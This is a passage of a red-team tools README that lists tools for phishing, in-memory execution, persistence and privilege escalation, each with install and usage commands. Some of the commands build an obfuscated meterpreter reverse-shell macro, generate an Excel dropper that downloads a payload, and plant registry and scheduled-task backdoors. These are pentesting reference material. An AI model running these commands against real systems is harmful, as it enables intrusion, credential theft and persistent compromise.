CONFIG, --config CONFIG&#xA;                        squarephish config file [Default: settings.config]&#xA;&#xA;  --debug               enable server debugging&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208217359-70e3ebd4-5cbf-40b9-9e4b-ca1608e4422f.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/securestate/king-phisher&#34;&gt;King Phisher&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;King Phisher is a tool that allows attackers to create and send phishing emails to victims to obtain sensitive information.&lt;/p&gt; &#xA;&lt;p&gt;It includes features like customizable templates, campaign management, and email sending capabilities, making it a powerful and easy-to-use tool for carrying out phishing attacks. With King Phisher, atackers can target individuals or organizations with targeted and convincing phishing emails, increasing the chances of success in their attacks.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install (Linux - Client &amp;amp; Server):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget -q https://github.com/securestate/king-phisher/raw/master/tools/install.sh &amp;amp;&amp;amp; \&#xA;sudo bash ./install.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Once King Phisher has been installed please follow the &lt;a href=&#34;https://github.com/rsmusllp/king-phisher/wiki/Getting-Started&#34;&gt;wiki page&lt;/a&gt; to setup SSH, Database config, SMTP server etc.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208217377-a6d36613-4ffe-486d-a630-99ed1bb7ed2d.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Execution&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/TheWover/donut/&#34;&gt;Donut&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A tool for in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies. It can be used to load and run custom payloads on target systems without the need to drop files to disk.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Windows)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone http://github.com/thewover/donut.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To generate the loader template, dynamic library donut.dll, the static library donut.lib and the generator donut.exe. Start an x64 Microsoft Visual Studio Developer Command Prompt, change to the directory where you cloned the Donut repository and enter the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmake -f Makefile.msvc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To do the same, except using MinGW-64 on Windows or Linux, change to the directory where you cloned the Donut repository and enter the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make -f Makefile.mingw&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Linux)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip3 install donut-shellcode&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Creating shellcode from an XSL file that pops up a calculator.&#xA;shellcode = donut.create(file=r&#34;C:\\Tools\\Source\\Repos\\donut\\calc.xsl&#34;)&#xA;&#xA;# Creating shellcode from an unmanaged DLL. Invokes DLLMain.&#xA;shellcode = donut.create(file=r&#34;C:\Tools\Source\Repos\donut\payload\test\hello.dll&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For full usage information, see the donut &lt;a href=&#34;https://github.com/TheWover/donut/#4-usage&#34;&gt;GitHub Page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://thewover.github.io/Bear-Claw/&#34;&gt;a recent blog post&lt;/a&gt; from The Wover for more info.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210077893-9d42cc2f-0ea0-414f-8103-42e29429321b.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/sevagas/macro_pack&#34;&gt;Macro_pack&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A tool used to automatize the obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for red teaming.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Binary)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Get the latest binary from &lt;a href=&#34;https://github.com/sevagas/macro_pack/releases/&#34;&gt;https://github.com/sevagas/macro_pack/releases/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Download binary on PC with genuine Microsoft Office installed.&lt;/li&gt; &#xA; &lt;li&gt;Open console, CD to binary dir and call the binary&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Git)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/sevagas/macro_pack.git&#xA;cd macro_pack&#xA;pip3 install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Help Page&#xA;python3 macro_pack.py  --help&#xA;&#xA;# List all supported file formats&#xA;macro_pack.exe --listformats&#xA;&#xA;# Obfuscate the vba file generated by msfvenom and puts result in a new VBA file.&#xA;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba&#xA;&#xA;# Obfuscate Empire stager VBA file and generate a MS Word document:&#xA;macro_pack.exe -f empire.vba -o -G myDoc.docm&#xA;&#xA;# Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)&#xA;echo &#34;https://myurl.url/payload.exe&#34; &#34;dropped.exe&#34; |  macro_pack.exe -o -t DROPPER -G &#34;drop.xlsm&#34; &#xA;&#xA;# Execute calc.exe via Dynamic Data Exchange (DDE) attack&#xA;echo calc.exe | macro_pack.exe --dde -G calc.xslx&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/209868800-7fbcfdec-8ae8-4693-8438-feebc2309667.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A collection of PowerShell scripts and modules that can be used to achieve a variety of red teaming objectives.&lt;/p&gt; &#xA;&lt;p&gt;Some of the features of PowerSploit:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Dump password hashes and extract clear-text passwords from memory&lt;/li&gt; &#xA; &lt;li&gt;Escalate privileges and bypass security controls&lt;/li&gt; &#xA; &lt;li&gt;Execute arbitrary PowerShell code and bypass execution restrictions&lt;/li&gt; &#xA; &lt;li&gt;Perform network reconnaissance and discovery&lt;/li&gt; &#xA; &lt;li&gt;Generate payloads and execute exploits&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt; &lt;em&gt;1. Save to PowerShell modules folder&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;First you will need to download the &lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit&#34;&gt;PowerSploit Folder&lt;/a&gt; and save it to your PowerShell modules folder.&lt;/p&gt; &#xA;&lt;p&gt;Your PowerShell modules folder path can be found with the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$Env:PSModulePath&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt; &lt;em&gt;2. Install PowerSploit as a PowerShell module&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;You will then need to install the PowerSploit module (use the name of the downloaded folder).&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;em&gt;Your PowerShell execution policy might block you, to fix this run the following command.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;powershell.exe -ep bypass&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now you can install the PowerSploit module.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Import-Module PowerSploit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Get-Command -Module PowerSploit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208247898-481f48c0-fe51-482f-b7c6-463bfecbd581.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;Rubeus&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A tool that can be used to perform various actions related to Microsoft Active Directory (AD) environments, such as dumping password hashes, creating/deleting users, and modifying user properties.&lt;/p&gt; &#xA;&lt;p&gt;Some of the features of Rubeus:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Kerberoasting&lt;/li&gt; &#xA; &lt;li&gt;Golden ticket attacks&lt;/li&gt; &#xA; &lt;li&gt;Silver ticket attacks&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Download)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can install the unofficial pre-compiled Rubeus binary &lt;a href=&#34;https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Compile)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Rubeus is compatible with &lt;a href=&#34;https://visualstudio.microsoft.com/vs/community/&#34;&gt;Visual Studio 2019 Community Edition&lt;/a&gt;. Open the rubeus &lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;project .sln&lt;/a&gt;, choose &#34;Release&#34;, and build.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Rubeus.exe -h&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208250015-674a6fee-95b7-4edf-bd59-fe459cd235ed.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/GhostPack/SharpUp&#34;&gt;SharpUp&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A nice tool for checking a victims endpoint for vulnerabilites relating to high integrity processes, groups, hijackable paths, etc.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Download)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can install the unofficial pre-compiled SharpUp binary &lt;a href=&#34;https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Compile)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpUp is compatible with &lt;a href=&#34;https://go.microsoft.com/fwlink/?LinkId=532606&amp;amp;clcid=0x409&#34;&gt;Visual Studio 2015 Community Edition&lt;/a&gt;. Open the SharpUp &lt;a href=&#34;https://github.com/GhostPack/SharpUp&#34;&gt;project .sln&lt;/a&gt;, choose &#34;Release&#34;, and build.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;SharpUp.exe audit&#xA;#-&amp;gt; Runs all vulnerability checks regardless of integrity level or group membership.&#xA;&#xA;SharpUp.exe HijackablePaths&#xA;#-&amp;gt; Check only if there are modifiable paths in the user&#39;s %PATH% variable.&#xA;&#xA;SharpUp.exe audit HijackablePaths&#xA;#-&amp;gt; Check only for modifiable paths in the user&#39;s %PATH% regardless of integrity level or group membership.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210079939-e709cced-04a2-44a5-9da0-f387bc6599b1.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Persistence&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/fortra/impacket&#34;&gt;Impacket&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Impacket provides a set of low-level Python bindings for various network protocols, including SMB, Kerberos, and LDAP, as well as higher-level libraries for interacting with network services and performing specific tasks such as dumping password hashes and creating network shares.&lt;/p&gt; &#xA;&lt;p&gt;It also includes a number of command-line tools that can be used to perform various tasks such as dumping SAM databases, enumerating domain trusts, and cracking Windows passwords.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python3 -m pip install impacket&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (With Example Scripts)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Download and extract &lt;a href=&#34;https://github.com/fortra/impacket&#34;&gt;the package&lt;/a&gt;, then navigate to the install folder and run...&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python3 -m pip install .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Extract NTLM hashes with local files&#xA;secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL&#xA;&#xA;# Gets a list of the sessions opened at the remote hosts&#xA;netview.py domain/user:password -target 192.168.10.2&#xA;&#xA;# Retrieves the MSSQL instances names from the target host.&#xA;mssqlinstance.py 192.168.1.2&#xA;&#xA;# This script will gather data about the domain&#39;s users and their corresponding email addresses.&#xA;GetADUsers.py domain/user:password@IP&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Great &lt;a href=&#34;https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/&#34;&gt;cheat sheet&lt;/a&gt; for Impacket usage.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210079475-a13f7fe2-7801-40dd-977b-e179d0658b47.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/EmpireProject/Empire&#34;&gt;Empire&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Empire is a post-exploitation framework that allows you to generate payloads for establishing remote connections with victim systems.&lt;/p&gt; &#xA;&lt;p&gt;Once a payload has been executed on a victim system, it establishes a connection back to the Empire server, which can then be used to issue commands and control the target system.&lt;/p&gt; &#xA;&lt;p&gt;Empire also includes a number of built-in modules and scripts that can be used to perform specific tasks, such as dumping password hashes, accessing the Windows registry, and exfiltrating data.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/EmpireProject/Empire&#xA;cd Empire&#xA;sudo ./setup/install.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Start Empire&#xA;./empire&#xA;&#xA;# List live agents&#xA;list agents&#xA;&#xA;# List live listeners&#xA;list listeners&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Nice usage &lt;a href=&#34;https://github.com/HarmJ0y/CheatSheets/raw/master/Empire.pdf&#34;&gt;cheat sheet&lt;/a&gt; by &lt;a href=&#34;https://github.com/HarmJ0y&#34;&gt;HarmJoy&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210080911-b3c7572a-a0dd-4664-a3e1-46b343db8a79.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/mandiant/SharPersist&#34;&gt;SharPersist&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A Windows persistence toolkit written in C#.&lt;/p&gt; &#xA;&lt;p&gt;The project has a &lt;a href=&#34;https://github.com/mandiant/SharPersist/wiki&#34;&gt;wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Binary)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can find the most recent release &lt;a href=&#34;https://github.com/mandiant/SharPersist/releases&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Compile)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Download the project files from the &lt;a href=&#34;https://github.com/mandiant/SharPersist&#34;&gt;GitHub Repo&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Load the Visual Studio project up and go to &#34;Tools&#34; --&amp;gt; &#34;NuGet Package Manager&#34; --&amp;gt; &#34;Package Manager Settings&#34;&lt;/li&gt; &#xA; &lt;li&gt;Go to &#34;NuGet Package Manager&#34; --&amp;gt; &#34;Package Sources&#34;&lt;/li&gt; &#xA; &lt;li&gt;Add a package source with the URL &#34;&lt;a href=&#34;https://api.nuget.org/v3/index.json&#34;&gt;https://api.nuget.org/v3/index.json&lt;/a&gt;&#34;&lt;/li&gt; &#xA; &lt;li&gt;Install the Costura.Fody NuGet package. The older version of Costura.Fody (3.3.3) is needed, so that you do not need Visual Studio 2019. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;Install-Package Costura.Fody -Version 3.3.3&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Install the TaskScheduler package &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;Install-Package TaskScheduler -Version 2.8.11&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;You can now build the project yourself!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;A full list of usage examples can be found &lt;a href=&#34;https://github.com/mandiant/SharPersist#adding-persistence-triggers-add&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;#KeePass&#xA;SharPersist -t keepass -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c calc.exe&#34; -f &#34;C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml&#34; -m add &#xA;&#xA;#Registry&#xA;SharPersist -t reg -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c calc.exe&#34; -k &#34;hkcurun&#34; -v &#34;Test Stuff&#34; -m add&#xA;&#xA;#Scheduled Task Backdoor&#xA;SharPersist -t schtaskbackdoor -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c calc.exe&#34; -n &#34;Something Cool&#34; -m add&#xA;&#xA;#Startup Folder&#xA;SharPersist -t startupfolder -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c calc.exe&#34; -f &#34;Some File&#34; -m add&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208880117-3ce7eefc-9e0b-477d-ada4-b3867909ff38.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Privilege Escalation&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&#34;&gt;LinPEAS&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;LinPEAS is a nice verbose privilege escalation for finding local privesc routes on Linux endpoints.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install + Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -L &#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&#34; | sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/192070104-8a121544-5c88-4c24-8b2e-590700b345e7.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&#34;&gt;WinPEAS&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;WinPEAS is a nice verbose privilege escalation for finding local privesc routes on Windows endpoints.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install + Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest &#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe&#34; -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(&#34;&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/192070193-fed8a0e8-b82a-4338-9209-6352f33ab6b8.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/diego-treitos/linux-smart-enumeration&#34;&gt;linux-smart-enumeration&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Linux smart enumeration is another good, less verbose, linux privesc tool for Linux.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install + Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl &#34;https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh&#34; -Lo lse.sh;chmod 700 lse.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/GhostPack/Certify&#34;&gt;Certify&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).&lt;/p&gt; &#xA;&lt;p&gt;Certify is designed to be used in conjunction with other red team tools and techniques, such as Mimikatz and PowerShell, to enable red teamers to perform various types of attacks, including man-in-the-middle attacks, impersonation attacks, and privilege escalation attacks.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Key features of Certify:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Certificate creation&lt;/li&gt; &#xA; &lt;li&gt;Certificate signing&lt;/li&gt; &#xA; &lt;li&gt;Certificate import&lt;/li&gt; &#xA; &lt;li&gt;Certificate trust modification&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Compile)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Certify is compatible with &lt;a href=&#34;https://visualstudio.microsoft.com/vs/community/&#34;&gt;Visual Studio 2019 Community Edition&lt;/a&gt;. Open the Certify project &lt;a href=&#34;https://github.com/GhostPack/Certify&#34;&gt;.sln&lt;/a&gt;, choose &#34;Release&#34;, and build.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Running Certify Through PowerShell)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you want to run Certify in-memory through a PowerShell wrapper, first compile the Certify and base64-encode the resulting assembly:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[Convert]::ToBase64String([IO.File]::ReadAllBytes(&#34;C:\Temp\Certify.exe&#34;)) | Out-File -Encoding ASCII C:\Temp\Certify.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Certify can then be loaded in a PowerShell script with the following (where &#34;aa...&#34; is replaced with the base64-encoded Certify assembly string):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(&#34;aa...&#34;))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The Main() method and any arguments can then be invoked as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Certify.Program]::Main(&#34;find /vulnerable&#34;.Split())&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full compile instructions can be found &lt;a href=&#34;https://github.com/GhostPack/Certify#compile-instructions&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# See if there are any vulnerable templates&#xA;Certify.exe find /vulnerable&#xA;&#xA;# Request a new certificate for a template/CA, specifying a DA localadmin as the alternate principal&#xA;Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full example walkthrough can be found &lt;a href=&#34;https://github.com/GhostPack/Certify#example-walkthrough&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210088651-28899ba5-cbbd-4b03-8000-068fd401476d.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Get-GPPPassword.ps1&#34;&gt;Get-GPPPassword&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Get-GPPPassword is a PowerShell script part of the PowerSploit toolkit, it is designed to retrieve passwords for local accounts that are created and managed using Group Policy Preferences (GPP).&lt;/p&gt; &#xA;&lt;p&gt;Get-GPPPassword works by searching the 